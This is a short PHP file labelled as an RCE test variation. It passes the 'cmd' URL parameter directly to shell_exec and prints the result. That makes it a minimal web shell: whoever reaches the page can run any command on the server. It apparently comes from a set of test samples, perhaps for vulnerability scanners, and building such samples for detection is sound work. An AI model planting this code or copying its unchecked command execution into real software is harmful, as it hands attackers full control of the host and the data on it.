<?php
// RCE test variation #972
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>